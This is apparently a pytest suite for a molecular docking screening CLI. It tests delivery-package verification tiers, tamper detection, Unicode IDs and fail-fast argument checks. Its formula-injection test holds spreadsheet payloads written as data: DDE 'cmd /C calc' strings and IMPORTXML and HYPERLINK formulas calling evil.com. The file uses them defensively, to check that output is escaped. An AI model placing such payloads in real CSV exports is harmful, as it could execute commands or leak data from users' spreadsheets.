"""Adversarial Empirical Challenge Suite for Milestone 4 (challenger_htvs_m4_2).

Focus:
1. End-to-end /screen to /verify delivery package integrity and 5-tier verification.
2. Spreadsheet formula injection defense & numeric field immunity.
3. Tamper detection and anti-fraud verification across all 5 tiers (T1~T5).
4. Boundary stress testing (Unicode IDs, invalid arguments, fail-fast validation).
"""

from __future__ import annotations

import csv
import os
import shutil
import tempfile
from pathlib import Path
from typing import Any
from unittest import mock

import pytest
from click.testing import CliRunner
from rdkit import Chem
from rdkit.Chem import AllChem

from dockstudio.cli.commands.screen import (
    run_screen_headless,
    run_screen_interactive,
    screen_cli,
)
from dockstudio.cli.commands.verify import (
    TestResult,
    _load_mol_safe,
    _verify_t1,
    _verify_t2,
    _verify_t3,
    _verify_t4,
    _verify_t5,
    load_delivery_package,
    load_energy_table,
    load_funnel_data,
    parse_conf_file,
    run_verify,
)
from dockstudio.engines.base import BaseEngine, EngineManifest
from dockstudio.models import Box, DockParams, DockResult, Pose

# Prevent pytest from collecting TestResult dataclass
TestResult.__test__ = False


# =============================================================================
# Synthetic Fixtures & Robust Mock Engine
# =============================================================================

_SAMPLE_PDBQT_TEMPLATE = """\
MODEL {model_idx}
REMARK VINA RESULT: {affinity:.2f} 0.000 0.000
ROOT
ATOM      1  C   UNL     1       1.000   2.000   3.000  1.00  0.00    +0.000 C
ATOM      2  O   UNL     1       2.000   2.500   3.000  1.00  0.00    -0.300 O
ENDROOT
ENDMDL
"""


def _make_sample_pdbqt(affinities: list[float]) -> str:
    """Generates valid multi-MODEL PDBQT string."""
    return "".join(
        _SAMPLE_PDBQT_TEMPLATE.format(model_idx=i, affinity=a)
        for i, a in enumerate(affinities, start=1)
    )


class AdversarialMockEngine(BaseEngine):
    """Controllable mock engine for adversarial testing of screening and verification."""

    manifest = EngineManifest(
        name="adversarial_mock",
        scoring_functions=["vina"],
        supports_batch_ligands=True,
    )

    def __init__(self):
        super().__init__()
        self.call_count = 0
        self.fixed_affinity: float | None = None
        self.custom_affinities: dict[str, float] = {}

    def is_available(self) -> tuple[bool, str]:
        return True, "Mock engine available"

    def set_affinity(self, lig_id_substring: str, affinity: float) -> None:
        self.custom_affinities[lig_id_substring] = affinity

    def dock(
        self,
        receptor_pdbqt: Path,
        ligand_pdbqt: Path,
        box: Box,
        params: DockParams,
        work_dir: Path,
        flex_pdbqt: Path | None = None,
    ) -> DockResult:
        self.call_count += 1
        work_dir.mkdir(parents=True, exist_ok=True)
        out_file = work_dir / "out.pdbqt"

        # Determine affinity: priority fixed -> custom -> molecular size heuristic -> default
        aff = self.fixed_affinity
        pdbqt_text = ligand_pdbqt.read_text(encoding="utf-8", errors="replace") if ligand_pdbqt.is_file() else ""

        if aff is None:
            for k, v in self.custom_affinities.items():
                if k in str(ligand_pdbqt) or k in pdbqt_text:
                    aff = v
                    break

        if aff is None:
            # Heuristic: TCM natural products (Baicalin, Quercetin, Curcumin) have >= 20 heavy atoms
            atom_lines = [l for l in pdbqt_text.splitlines() if l.startswith(("ATOM  ", "HETATM"))]
            if len(atom_lines) >= 20:
                aff = -9.20  # Tight binder (TCM hits)
            else:
                aff = -5.50  # Weaker binder (simple small molecules)

        out_file.write_text(_make_sample_pdbqt([aff]), encoding="utf-8")

        # Load actual ligand structure so docked conformer matches exact atom counts for T1 RMSD
        lig_mol = _load_mol_safe(ligand_pdbqt)
        if lig_mol is None:
            lig_mol = Chem.AddHs(Chem.MolFromSmiles("c1ccccc1"))
            AllChem.EmbedMolecule(lig_mol, randomSeed=params.seed or 42)

        docked_sdf = work_dir / "docked.sdf"
        docked_sdf.write_text(Chem.MolToMolBlock(lig_mol), encoding="utf-8")

        pose = Pose(index=1, affinity=aff, file=str(docked_sdf), mol=lig_mol)
        return DockResult(
            engine="adversarial_mock",
            engine_version="1.0.0",
            params=params,
            box=box,
            poses=[pose],
            log="adversarial mock dock log",
            run_dir=str(work_dir),
        )

    def dock_multi_seed(self, seed: int) -> list[dict[str, Any]]:
        """Used by _verify_t2 for multi-seed sensitivity evaluation."""
        aff = self.fixed_affinity if self.fixed_affinity is not None else -8.50
        return [
            {"id": f"MOL_{i}", "affinity": aff + (seed % 10) * 0.01}
            for i in range(1, 11)
        ]


@pytest.fixture
def runner() -> CliRunner:
    return CliRunner()


@pytest.fixture
def mock_receptor(tmp_path: Path) -> tuple[Path, Path]:
    """Generates synthetic receptor PDB and PDBQT files."""
    rec_dir = tmp_path / "mock_rec"
    rec_dir.mkdir(parents=True, exist_ok=True)
    pdb_path = rec_dir / "receptor.pdb"
    pdbqt_path = rec_dir / "receptor.pdbqt"

    pdb_content = (
        "HEADER    MOCK RECEPTOR\n"
        "ATOM      1  N   ASP A  25      10.000  10.000  10.000  1.00 20.00           N\n"
        "ATOM      2  CA  ASP A  25      11.000  10.000  10.000  1.00 20.00           C\n"
        "ATOM      3  N   THR A  80      10.000  12.000  10.000  1.00 20.00           N\n"
        "ATOM      4  CA  THR A  80      11.000  12.000  10.000  1.00 20.00           C\n"
        "END\n"
    )
    pdb_path.write_text(pdb_content, encoding="utf-8")
    pdbqt_path.write_text(pdb_content, encoding="utf-8")
    return pdb_path, pdbqt_path


@pytest.fixture
def mock_crystal_ligand(tmp_path: Path) -> Path:
    """Generates a valid co-crystal ligand SDF centered exactly inside the box."""
    m = Chem.AddHs(Chem.MolFromSmiles("c1ccccc1"))
    AllChem.EmbedMolecule(m, randomSeed=42)
    conf = m.GetConformer()
    pts = conf.GetPositions()
    c = pts.mean(axis=0)
    for i in range(m.GetNumAtoms()):
        conf.SetAtomPosition(i, pts[i] - c + [10.0, 10.0, 10.0])
    c_path = tmp_path / "crystal_ligand.sdf"
    c_path.write_text(Chem.MolToMolBlock(m), encoding="utf-8")
    return c_path


@pytest.fixture
def mock_engine_patch():
    """Patches get_engine to return AdversarialMockEngine with realistic TCM affinities."""
    eng = AdversarialMockEngine()
    with mock.patch("dockstudio.cli.commands.screen.get_engine", return_value=eng), \
         mock.patch("dockstudio.cli.commands.screen.available_engines", return_value=[eng]), \
         mock.patch("dockstudio.core.screen_runner.get_engine", return_value=eng):
        yield eng


# =============================================================================
# Test Suite 1: End-to-End Delivery Package Integrity & Acceptance
# =============================================================================

class TestEndToEndDeliveryAcceptance:
    """Adversarially validates that /screen delivery package complies with /verify."""

    def test_end_to_end_delivery_package_completeness(
        self,
        runner: CliRunner,
        mock_receptor: tuple[Path, Path],
        mock_engine_patch: AdversarialMockEngine,
        tmp_path: Path,
    ):
        """Verifies that /screen produces all 5 delivery artifacts and passes run_verify."""
        pdb_path, _ = mock_receptor
        out_dir = tmp_path / "delivery_pkg"

        # Construct small SMILES library with achiral molecules
        smi_file = tmp_path / "test_lib.smi"
        smi_file.write_text(
            "CC(=O)Oc1ccccc1C(=O)O Aspirin\n"
            "c1ccccc1 Benzene\n"
            "CCO Ethanol\n",
            encoding="utf-8",
        )

        args = [
            "--non-interactive",
            "--receptor", str(pdb_path),
            "--library", str(smi_file),
            "--box-center", "10.0,10.0,10.0",
            "--box-size", "20.0,20.0,20.0",
            "--tier1-ratio", "1.0",
            "--tier2-ratio", "1.0",
            "--seeds", "42,1024,2026",
            "--out", str(out_dir),
        ]
        result = runner.invoke(screen_cli, args)
        assert result.exit_code == 0, f"Screen failed: {result.output}"

        # 1. Assert all 5 delivery artifacts exist
        assert (out_dir / "conf.txt").is_file(), "conf.txt (D5) missing"
        assert (out_dir / "receptor.pdbqt").is_file(), "receptor.pdbqt (D1) missing"
        assert (out_dir / "funnel.csv").is_file(), "funnel.csv (D10) missing"
        assert (out_dir / "screening_results.csv").is_file(), "screening_results.csv (D3) missing"
        assert (out_dir / "poses").is_dir(), "poses directory (D7) missing"

        # Check pose files match energy table candidate count
        energy_rows = load_energy_table(out_dir / "screening_results.csv")
        poses = list((out_dir / "poses").glob("*.sdf"))
        assert len(poses) == len(energy_rows) >= 3, (
            f"Expected {len(energy_rows)} pose SDF files, found {len(poses)}"
        )

        # 2. Verify conf.txt format & parameters
        conf = parse_conf_file(out_dir / "conf.txt")
        assert conf.center == (10.0, 10.0, 10.0)
        assert conf.size == (20.0, 20.0, 20.0)
        assert conf.seed == 42
        assert conf.scoring == "vina"

        # 3. Verify funnel.csv closure
        funnel = load_funnel_data(out_dir / "funnel.csv")
        assert funnel.get("raw", 0) == 3
        assert funnel.get("docked_success", 0) == len(energy_rows)

        # 4. Invoke run_verify
        rc = run_verify(out_dir)
        assert rc == 0, f"run_verify returned non-zero exit code: {rc}"

    def test_all_five_tiers_active_pass_with_engine_and_crystal(
        self,
        runner: CliRunner,
        mock_receptor: tuple[Path, Path],
        mock_crystal_ligand: Path,
        mock_engine_patch: AdversarialMockEngine,
        tmp_path: Path,
    ):
        """Verifies that all 5 tiers (T1~T5) pass with status PASS (0 failures, 0 errors)."""
        pdb_path, _ = mock_receptor
        out_dir = tmp_path / "all_five_tiers_pkg"

        smi_file = tmp_path / "five_tier_lib.smi"
        smi_file.write_text(
            "CC(=O)Oc1ccccc1C(=O)O Aspirin\n"
            "c1ccccc1 Benzene\n"
            "CCO Ethanol\n",
            encoding="utf-8",
        )

        args = [
            "--non-interactive",
            "--receptor", str(pdb_path),
            "--library", str(smi_file),
            "--box-center", "10.0,10.0,10.0",
            "--box-size", "20.0,20.0,20.0",
            "--tier1-ratio", "1.0",
            "--tier2-ratio", "1.0",
            "--out", str(out_dir),
        ]
        res = runner.invoke(screen_cli, args)
        assert res.exit_code == 0

        # Inject co-crystal ligand for active T4 verification
        shutil.copyfile(mock_crystal_ligand, out_dir / "crystal_ligand.sdf")

        # Load package and run tiers with recalculation engine
        pkg = load_delivery_package(out_dir)
        try:
            conf = parse_conf_file(pkg.conf_path)
            energy_rows = load_energy_table(pkg.energy_path)
            mock_engine_patch.fixed_affinity = energy_rows[0]["affinity"]

            options = {"engine": mock_engine_patch, "recalculate": True}
            r1 = _verify_t1(pkg, conf, energy_rows, options)
            r2 = _verify_t2(pkg, conf, energy_rows, options)
            r3 = _verify_t3(pkg, energy_rows, options)
            r4 = _verify_t4(pkg, conf, options)
            r5 = _verify_t5(pkg, energy_rows, options)

            # T1: Numerical Reproducibility
            assert r1.passed is True, f"T1 failed: {r1.message}"
            assert r1.status == "PASS"

            # T2: Stochastic Sensitivity
            assert r2.passed is True, f"T2 failed: {r2.message}"
            assert r2.status == "PASS"

            # T3: Chemical Identity & Stereochemistry
            assert r3.passed is True, f"T3 failed: {r3.message}"
            assert r3.status == "PASS"

            # T4: Spatial Coordinate Confinement
            assert r4.passed is True, f"T4 failed: {r4.message}"
            assert r4.status == "PASS"

            # T5: Screening Funnel Self-Consistency
            assert r5.passed is True, f"T5 failed: {r5.message}"
            assert r5.status == "PASS"

        finally:
            pkg.cleanup()

    def test_interactive_wizard_zero_prompt_demo_delivery(
        self,
        mock_engine_patch: AdversarialMockEngine,
        tmp_path: Path,
    ):
        """Verifies that run_screen_interactive(demo=True) generates valid package passing /verify."""
        out_dir = tmp_path / "interactive_demo_pkg"

        # Execute wizard in demo mode (Baicalin & Quercetin win by affinity ranking)
        rc = run_screen_interactive(demo=True, out=out_dir)
        assert rc == 0, f"Interactive demo returned {rc}"

        # Verify delivery artifacts
        assert (out_dir / "conf.txt").is_file()
        assert (out_dir / "receptor.pdbqt").is_file()
        assert (out_dir / "funnel.csv").is_file()
        assert (out_dir / "screening_results.csv").is_file()
        assert (out_dir / "poses").is_dir()

        # Run acceptance verifier
        verify_rc = run_verify(out_dir)
        assert verify_rc == 0, f"run_verify failed with code {verify_rc}"


# =============================================================================
# Test Suite 2: Formula Injection Defense (CSV Injection Attacks)
# =============================================================================

class TestFormulaInjectionDefenseAdversarial:
    """Stress-tests resistance to Excel/Calc CSV formula injection attacks."""

    _INJECTION_PAYLOADS = [
        ("=1+2_InjectedName", "CC(=O)Oc1ccccc1C(=O)O"),
        ("+cmd|' /C calc'!A0", "c1ccccc1"),
        ("-2+3+cmd|' /C calc'!A0", "CCO"),
        ("@SUM(1,2,3)*cmd|' /C calc'!A0", "CCN"),
        ("=10+20", "CCC"),
        ("-5.0+5.0", "CCCC"),
        ("+12345", "CCOCC"),
        ("@IMPORTXML(\"http://evil.com\",\"//\")", "CC(=O)N"),
    ]

    def test_comprehensive_formula_injection_payloads_neutralized(
        self,
        runner: CliRunner,
        mock_receptor: tuple[Path, Path],
        mock_engine_patch: AdversarialMockEngine,
        tmp_path: Path,
    ):
        """Injects diverse formula injection attack vectors in CSV library and verifies neutralization."""
        pdb_path, _ = mock_receptor
        out_dir = tmp_path / "formula_injection_pkg"

        # Create CSV library containing hostile payloads including quoted tab/newlines
        csv_file = tmp_path / "malicious_library.csv"
        with open(csv_file, "w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow(["smiles", "name"])
            for name, smi in self._INJECTION_PAYLOADS:
                writer.writerow([smi, name])
            # Additional payload with leading tab
            writer.writerow(["COC", "\t=HYPERLINK(\"http://evil.com\",\"Click\")"])

        args = [
            "--non-interactive",
            "--receptor", str(pdb_path),
            "--library", str(csv_file),
            "--box-center", "10.0,10.0,10.0",
            "--tier1-ratio", "1.0",
            "--tier2-ratio", "1.0",
            "--out", str(out_dir),
        ]
        res = runner.invoke(screen_cli, args)
        assert res.exit_code == 0, f"Screen failed: {res.output}"

        csv_path = out_dir / "screening_results.csv"

        # Verify parsed CSV cells: every malicious payload MUST begin with single quote
        with open(csv_path, "r", encoding="utf-8") as f:
            reader = csv.DictReader(f)
            rows = list(reader)

        assert len(rows) == len(self._INJECTION_PAYLOADS) + 1
        name_map = {r["SMILES"]: r["Ligand_Name"] for r in rows}

        for expected_name, smi in self._INJECTION_PAYLOADS:
            actual_name = name_map.get(smi) or name_map.get(Chem.MolToSmiles(Chem.MolFromSmiles(smi)))
            assert actual_name is not None, f"SMILES {smi} not found in output"
            assert actual_name.startswith("'"), (
                f"Payload {expected_name!r} was NOT escaped with leading single quote: {actual_name!r}"
            )
            assert actual_name[1:] == expected_name

        # Check tab payload: stripped by CSV loader to formula, then neutralized with leading quote
        tab_name = name_map.get("COC")
        assert tab_name is not None and tab_name.startswith("'")
        assert "=HYPERLINK" in tab_name

    def test_numeric_columns_immunity_against_corruption(
        self,
        runner: CliRunner,
        mock_receptor: tuple[Path, Path],
        mock_engine_patch: AdversarialMockEngine,
        tmp_path: Path,
    ):
        """Verifies that negative numbers in numeric columns are NOT corrupted with leading quotes."""
        pdb_path, _ = mock_receptor
        out_dir = tmp_path / "numeric_columns_pkg"

        smi_file = tmp_path / "numeric_check.smi"
        smi_file.write_text(
            "CC(=O)Oc1ccccc1C(=O)O Aspirin\n"
            "c1ccccc1 Benzene\n",
            encoding="utf-8",
        )

        args = [
            "--non-interactive",
            "--receptor", str(pdb_path),
            "--library", str(smi_file),
            "--box-center", "10.0,10.0,10.0",
            "--tier1-ratio", "1.0",
            "--tier2-ratio", "1.0",
            "--out", str(out_dir),
        ]
        res = runner.invoke(screen_cli, args)
        assert res.exit_code == 0

        csv_path = out_dir / "screening_results.csv"
        with open(csv_path, "r", encoding="utf-8") as f:
            reader = csv.DictReader(f)
            rows = list(reader)

        assert len(rows) > 0
        for r in rows:
            # Affinity values are negative floats (e.g. -8.500)
            aff_mean_str = r["Affinity_Mean_kcal_mol"]
            aff_str = r["Affinity"]

            # Must NOT start with single quote
            assert not aff_mean_str.startswith("'"), f"Affinity_Mean corrupted: {aff_mean_str}"
            assert not aff_str.startswith("'"), f"Affinity corrupted: {aff_str}"

            # Must be valid float
            val_mean = float(aff_mean_str)
            val_aff = float(aff_str)
            assert val_mean < 0.0, f"Expected negative affinity, got {val_mean}"
            assert val_aff < 0.0, f"Expected negative affinity, got {val_aff}"

    def test_downstream_verify_unescapes_safely_preserving_chemistry(
        self,
        runner: CliRunner,
        mock_receptor: tuple[Path, Path],
        mock_engine_patch: AdversarialMockEngine,
        tmp_path: Path,
    ):
        """Verifies that load_energy_table strips single quote and restores original ID & SMILES."""
        pdb_path, _ = mock_receptor
        out_dir = tmp_path / "unescaping_pkg"

        smi_file = tmp_path / "unescape_lib.smi"
        smi_file.write_text(
            "CC(=O)Oc1ccccc1C(=O)O =1+2_Aspirin\n"
            "c1ccccc1 +cmd_Benzene\n",
            encoding="utf-8",
        )

        args = [
            "--non-interactive",
            "--receptor", str(pdb_path),
            "--library", str(smi_file),
            "--box-center", "10.0,10.0,10.0",
            "--tier1-ratio", "1.0",
            "--tier2-ratio", "1.0",
            "--out", str(out_dir),
        ]
        res = runner.invoke(screen_cli, args)
        assert res.exit_code == 0

        energy_rows = load_energy_table(out_dir / "screening_results.csv")
        assert len(energy_rows) == 2

        # Check unescaped IDs
        for item in energy_rows:
            raw_dict = item["raw"]
            lig_name = raw_dict.get("ligand_name", "")
            if lig_name.startswith("'"):
                lig_name = lig_name[1:]
            assert not lig_name.startswith("'"), f"Still contains leading quote: {lig_name}"
            # Smiles must be valid RDKit parseable structure
            smiles = item["smiles"]
            assert not smiles.startswith("'")
            m = Chem.MolFromSmiles(smiles)
            assert m is not None, f"Failed to parse restored SMILES: {smiles}"


# =============================================================================
# Test Suite 3: Tampering and Anti-Fraud Detection Across All 5 Tiers
# =============================================================================

class TestTamperingAndIntegrityDetection:
    """Verifies that /verify correctly identifies and rejects tampered delivery packages."""

    @pytest.fixture
    def base_valid_package(
        self,
        runner: CliRunner,
        mock_receptor: tuple[Path, Path],
        mock_crystal_ligand: Path,
        mock_engine_patch: AdversarialMockEngine,
        tmp_path: Path,
    ) -> Path:
        """Generates a complete, valid delivery package for tamper testing."""
        pdb_path, _ = mock_receptor
        out_dir = tmp_path / "base_delivery_pkg"

        smi_file = tmp_path / "base_lib.smi"
        smi_file.write_text(
            "CC(=O)Oc1ccccc1C(=O)O Aspirin\n"
            "c1ccccc1 Benzene\n"
            "CCN Ethylamine\n"
            "CCO Ethanol\n",
            encoding="utf-8",
        )

        args = [
            "--non-interactive",
            "--receptor", str(pdb_path),
            "--library", str(smi_file),
            "--box-center", "10.0,10.0,10.0",
            "--box-size", "20.0,20.0,20.0",
            "--tier1-ratio", "1.0",
            "--tier2-ratio", "1.0",
            "--out", str(out_dir),
        ]
        res = runner.invoke(screen_cli, args)
        assert res.exit_code == 0
        shutil.copyfile(mock_crystal_ligand, out_dir / "crystal_ligand.sdf")

        # Sanity check: base package must pass verify
        assert run_verify(out_dir) == 0
        return out_dir

    def test_tamper_tier1_missing_critical_artifacts(self, base_valid_package: Path, tmp_path: Path):
        """Tampering Test: Deleting critical delivery files triggers rejection."""
        # 1. Missing conf.txt -> returns 2
        p1 = tmp_path / "tamper_t1_no_conf"
        shutil.copytree(base_valid_package, p1)
        (p1 / "conf.txt").unlink()
        assert run_verify(p1) == 2

        # 2. Missing receptor.pdbqt -> T1 fails -> returns 1
        p2 = tmp_path / "tamper_t1_no_rec"
        shutil.copytree(base_valid_package, p2)
        (p2 / "receptor.pdbqt").unlink()
        assert run_verify(p2) == 1

        # 3. Missing poses/ directory -> T1/T3 fail -> returns 1
        p3 = tmp_path / "tamper_t1_no_poses"
        shutil.copytree(base_valid_package, p3)
        shutil.rmtree(p3 / "poses")
        assert run_verify(p3) == 1

        # 4. Missing funnel.csv -> T5 fails -> returns 1
        p4 = tmp_path / "tamper_t1_no_funnel"
        shutil.copytree(base_valid_package, p4)
        (p4 / "funnel.csv").unlink()
        assert run_verify(p4) == 1

    def test_tamper_tier2_corrupted_box_specification(self, base_valid_package: Path, tmp_path: Path):
        """Tampering Test: Corrupting conf.txt box specifications triggers rejection."""
        # 1. Non-numeric coordinates in conf.txt -> returns 2
        p1 = tmp_path / "tamper_t2_non_numeric"
        shutil.copytree(base_valid_package, p1)
        (p1 / "conf.txt").write_text(
            "center_x = INVALID_FLOAT\ncenter_y = 10.0\ncenter_z = 10.0\n"
            "size_x = 20.0\nsize_y = 20.0\nsize_z = 20.0\nseed = 42\n",
            encoding="utf-8",
        )
        assert run_verify(p1) == 2

        # 2. Missing seed parameter in conf.txt -> T1 fails -> returns 1
        p2 = tmp_path / "tamper_t2_missing_seed"
        shutil.copytree(base_valid_package, p2)
        (p2 / "conf.txt").write_text(
            "center_x = 10.0\ncenter_y = 10.0\ncenter_z = 10.0\n"
            "size_x = 20.0\nsize_y = 20.0\nsize_z = 20.0\n",
            encoding="utf-8",
        )
        assert run_verify(p2) == 1

    def test_tamper_tier3_pose_file_and_inchikey_mismatch(self, base_valid_package: Path, tmp_path: Path):
        """Tampering Test: Altering or substituting pose structures triggers T3 failure."""
        # 1. Pose deletion: delete top candidate pose file
        p1 = tmp_path / "tamper_t3_del_pose"
        shutil.copytree(base_valid_package, p1)
        poses = list((p1 / "poses").glob("*.sdf"))
        assert len(poses) > 0
        poses[0].unlink()
        matching_pdbqt = poses[0].with_suffix(".pdbqt")
        if matching_pdbqt.is_file():
            matching_pdbqt.unlink()

        pkg1 = load_delivery_package(p1)
        try:
            r3 = _verify_t3(pkg1, load_energy_table(pkg1.energy_path), None)
            assert r3.passed is False, "T3 should have failed when top pose is deleted"
            assert r3.status == "FAIL"
        finally:
            pkg1.cleanup()
        assert run_verify(p1) == 1

        # 2. Pose substitution attack: overwrite pose with completely different structure
        p2 = tmp_path / "tamper_t3_swap_pose"
        shutil.copytree(base_valid_package, p2)
        poses2 = list((p2 / "poses").glob("*.sdf"))
        foreign_mol = Chem.AddHs(Chem.MolFromSmiles("CC(C)CCCC(C)C1CCC2C1(CCC3C2CC=C4C3(CCC(C4)O)C)C"))
        AllChem.EmbedMolecule(foreign_mol, randomSeed=123)
        poses2[0].write_text(Chem.MolToMolBlock(foreign_mol), encoding="utf-8")

        pkg2 = load_delivery_package(p2)
        try:
            r3 = _verify_t3(pkg2, load_energy_table(pkg2.energy_path), None)
            assert r3.passed is False, "T3 should have caught InChIKey mismatch on substituted pose"
            assert "InChIKey" in r3.message or "立" in r3.observed or r3.status == "FAIL"
        finally:
            pkg2.cleanup()
        assert run_verify(p2) == 1

    def test_tamper_tier4_spatial_confinement_breach(self, base_valid_package: Path, tmp_path: Path):
        """Tampering Test: Spatial displacement of co-crystal ligand triggers T4 rejection."""
        # 1. Translation attack: shift co-crystal ligand by +50 Å outside the box
        p1 = tmp_path / "tamper_t4_shifted"
        shutil.copytree(base_valid_package, p1)
        c_mol = Chem.MolFromMolBlock((p1 / "crystal_ligand.sdf").read_text(encoding="utf-8"))
        conf = c_mol.GetConformer()
        for i in range(c_mol.GetNumAtoms()):
            p = conf.GetAtomPosition(i)
            conf.SetAtomPosition(i, (p.x + 50.0, p.y + 50.0, p.z + 50.0))
        (p1 / "crystal_ligand.sdf").write_text(Chem.MolToMolBlock(c_mol), encoding="utf-8")

        pkg1 = load_delivery_package(p1)
        try:
            r4 = _verify_t4(pkg1, parse_conf_file(pkg1.conf_path), None)
            assert r4.passed is False, "T4 should have failed on shifted crystal ligand"
            assert r4.status == "FAIL"
            assert "偏移" in r4.message or "质心距离" in r4.observed
        finally:
            pkg1.cleanup()
        assert run_verify(p1) == 1

        # 2. Box shrink attack: shrink box size to 2.0 Å in conf.txt
        p2 = tmp_path / "tamper_t4_shrink"
        shutil.copytree(base_valid_package, p2)
        conf_lines = (p2 / "conf.txt").read_text(encoding="utf-8").splitlines()
        new_lines = []
        for line in conf_lines:
            if line.startswith("size_"):
                axis = line.split("=")[0].strip()
                new_lines.append(f"{axis} = 2.000")
            else:
                new_lines.append(line)
        (p2 / "conf.txt").write_text("\n".join(new_lines), encoding="utf-8")

        pkg2 = load_delivery_package(p2)
        try:
            r4 = _verify_t4(pkg2, parse_conf_file(pkg2.conf_path), None)
            assert r4.passed is False, "T4 should have failed when box is shrunk"
            assert r4.status == "FAIL"
        finally:
            pkg2.cleanup()
        assert run_verify(p2) == 1

    def test_tamper_tier5_funnel_mass_conservation_and_monotonicity(
        self, base_valid_package: Path, tmp_path: Path
    ):
        """Tampering Test: Manipulating funnel counts or deleting result rows triggers T5 rejection."""
        # 1. Phantom compound injection: change docked_success in funnel.csv
        p1 = tmp_path / "tamper_t5_phantom"
        shutil.copytree(base_valid_package, p1)
        lines = (p1 / "funnel.csv").read_text(encoding="utf-8").splitlines()
        tampered = []
        for l in lines:
            if l.startswith("docked_success"):
                tampered.append("docked_success,999")
            else:
                tampered.append(l)
        (p1 / "funnel.csv").write_text("\n".join(tampered), encoding="utf-8")

        pkg1 = load_delivery_package(p1)
        try:
            r5 = _verify_t5(pkg1, load_energy_table(pkg1.energy_path), None)
            assert r5.passed is False, "T5 should have failed on phantom compound injection"
            assert r5.status == "FAIL"
        finally:
            pkg1.cleanup()
        assert run_verify(p1) == 1

        # 2. Result deletion attack: delete rows from screening_results.csv without touching funnel.csv
        p2 = tmp_path / "tamper_t5_row_delete"
        shutil.copytree(base_valid_package, p2)
        csv_lines = (p2 / "screening_results.csv").read_text(encoding="utf-8").splitlines()
        assert len(csv_lines) >= 4
        # Keep header and first row only, deleting remaining rows
        (p2 / "screening_results.csv").write_text("\n".join(csv_lines[:2]), encoding="utf-8")

        pkg2 = load_delivery_package(p2)
        try:
            r5 = _verify_t5(pkg2, load_energy_table(pkg2.energy_path), None)
            assert r5.passed is False, "T5 should have failed when results rows do not match funnel count"
            assert r5.status == "FAIL"
        finally:
            pkg2.cleanup()
        assert run_verify(p2) == 1


# =============================================================================
# Test Suite 4: Adversarial Boundary & Fail-Fast Validation
# =============================================================================

class TestAdversarialBoundaryAndEdgeCases:
    """Tests extreme edge cases, non-ASCII Unicode identifiers, and fail-fast CLI validation."""

    def test_unicode_herb_names_and_special_character_ids(
        self,
        runner: CliRunner,
        mock_receptor: tuple[Path, Path],
        mock_engine_patch: AdversarialMockEngine,
        tmp_path: Path,
    ):
        """Verifies screening and acceptance of Unicode Chinese herb names and special chars."""
        pdb_path, _ = mock_receptor
        out_dir = tmp_path / "unicode_pkg"

        smi_file = tmp_path / "unicode_lib.smi"
        smi_file.write_text(
            "CC(=O)Oc1ccccc1C(=O)O 黄芩素_Baicalein_[123]\n"
            "c1ccccc1 苯 (Benzene) #01\n"
            "CCO 乙醇 Ethanol\n",
            encoding="utf-8",
        )

        args = [
            "--non-interactive",
            "--receptor", str(pdb_path),
            "--library", str(smi_file),
            "--box-center", "10.0,10.0,10.0",
            "--tier1-ratio", "1.0",
            "--tier2-ratio", "1.0",
            "--out", str(out_dir),
        ]
        res = runner.invoke(screen_cli, args)
        assert res.exit_code == 0, f"Screen failed: {res.output}"

        # Verify acceptance
        assert run_verify(out_dir) == 0

    def test_screen_cli_validation_fail_fast(
        self,
        runner: CliRunner,
        mock_receptor: tuple[Path, Path],
        tmp_path: Path,
    ):
        """Verifies that screen CLI rejects invalid arguments fast with exit code 2."""
        pdb_path, _ = mock_receptor
        dummy_lib = tmp_path / "dummy.smi"
        dummy_lib.write_text("c1ccccc1 Benzene\n", encoding="utf-8")

        # 1. Missing receptor in non-interactive mode
        r1 = runner.invoke(screen_cli, ["--non-interactive", "--library", str(dummy_lib)])
        assert r1.exit_code == 2

        # 2. Missing library in non-interactive mode
        r2 = runner.invoke(screen_cli, ["--non-interactive", "--receptor", str(pdb_path)])
        assert r2.exit_code == 2

        # 3. Non-existent receptor file
        r3 = runner.invoke(
            screen_cli,
            ["--non-interactive", "--receptor", "non_existent.pdb", "--library", str(dummy_lib)],
        )
        assert r3.exit_code == 2

        # 4. Non-existent library file
        r4 = runner.invoke(
            screen_cli,
            ["--non-interactive", "--receptor", str(pdb_path), "--library", "non_existent.smi"],
        )
        assert r4.exit_code == 2
